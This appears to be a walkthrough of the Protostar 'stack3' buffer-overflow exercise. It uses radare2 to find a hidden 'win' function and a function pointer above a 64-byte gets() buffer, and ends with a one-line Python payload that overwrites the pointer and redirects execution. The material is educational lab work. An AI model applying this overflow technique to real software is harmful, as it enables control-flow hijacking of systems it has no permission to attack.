Again we go with another binary where we have a vulnerable function "gets", with a pointer to a buffer, just reminder to see the size of the buffer with radare2 once we've seen the main function:
    # r2 ./stack3
    > aaa   # analyze binary
    > afl   # list functions
    > s main    # move to main function
    > pdf   # show disassembly of the function
    > afvf  # show static stack print

If we search for the strings in visual mode:
    > vvv   # enter visual mode
    > [ESC] # look all possible options for visual boxes
     choose search strings in data sections

We see that there's a string "code flow successfully changed" in the address 0x8048540, with this we can see where this string is used.

    > axt 0x8048540
    sym.win 0x804842a [DATA] mov dword [esp], str.code_flow_successfully_changed

We can see that there's a symbol of a function where this string is used "sym.win", we can print its disassembly:
    
    > s sym.win
    > pdf

This function would be our "good boy" that we have to reach. How can we reach this? is there any reference to that function?

    > axt sym.win

We don't have any call to this function, so we have to trick some way the program to jump there.

In function main, we have as we said the buffer of size 0x40, and then we have a path in 0x0804845c, where if we've been able to modify a variable var_8h (renamed to p_to_function), we see that program prints the string "calling function pointer, jumping to 0x%08x\n", this path is executed if the variable var_8h has something different than 0, so if we are able to modify that variable, we will execute that path.
And finally that path will execute that pointer as a function.

With the static print of the stack we see that variable is above of our buffer, and our buffer was vulnerable because of vulnerable gets function.

With again trash of size 0x40, and then the pointer to the function in reverse (because of little endian), we will be able to call that function.

    # python -c "print 'A'*0x40 + '\x24\x84\x04\x08'" | ./stack3
    calling function pointer, jumping to 0x08048424
    code flow successfully changed

Where the string \x24\x84\x04\x08 is the address of sym.win in reverse.
